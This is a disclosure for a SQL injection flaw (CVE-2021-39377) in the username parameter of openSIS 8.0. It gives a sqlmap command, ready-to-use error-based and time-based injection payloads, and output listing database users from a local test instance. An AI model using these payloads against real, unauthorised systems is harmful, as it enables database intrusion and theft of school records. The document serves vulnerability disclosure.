# OPENSIS 8.0 SQL INJECTION VULNERABILITY CVE-2021-39377

A SQL Injection vulnerability exists in version 8.0 of openSIS when MySQL (MariaDB) is being used as the application database. A malicious attacker can issue SQL commands to the Mysql (MariaDB) database through the vulnerable username= parameter. 

Vulnerable PHP Page:

index.php - username parameter

Vulnerable Payload

sqlmap "http://localhost:8081/index.php" --users --data="USERNAME=admin&PASSWORD=test1234%21&language=en&log=" --dbms="MySQL" --level=3 --risk=2 

SQL Injection:

http://localhost:8081/index.php             
```
Parameter: USERNAME (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: USERNAME=admin') AND (SELECT 4391 FROM(SELECT COUNT(*),CONCAT(0x71716b7071,(SELECT (ELT(4391=4391,1))),0x716b717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IzoO&PASSWORD=test1234!&language=en&log=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: USERNAME=admin') AND (SELECT 2137 FROM (SELECT(SLEEP(5)))BwzJ)-- sbsL&PASSWORD=test1234!&language=en&log=

[22:35:47] [INFO] testing MySQL
[22:35:47] [INFO] confirming MySQL
[22:35:47] [INFO] the back-end DBMS is MySQL
web application technology: PHP, PHP 7.4.21
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[22:35:47] [INFO] fetching database users
database management system users [3]:
[*] 'mariadb.sys'@'localhost'
[*] 'mysql'@'localhost'
[*] 'root'@'localhost'
```
Discovered by Nathan Johnson, August 2021
